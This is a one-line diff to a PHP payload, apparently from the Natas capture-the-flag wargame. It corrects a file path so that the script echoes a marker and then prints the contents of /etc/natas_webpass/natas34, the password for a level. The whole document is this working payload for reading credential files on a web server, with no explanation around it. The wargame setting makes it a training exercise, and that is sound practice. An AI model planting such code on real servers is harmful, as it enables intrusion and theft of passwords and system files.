@@ -1,1 +1,1 @@
-<?php echo "LASLDaASDASD";echo file_get_contents('/etc/natas_webpass_7natas34');?>
+<?php echo "LASLDaASDASD";echo file_get_contents('/etc/natas_webpass/natas34');?>
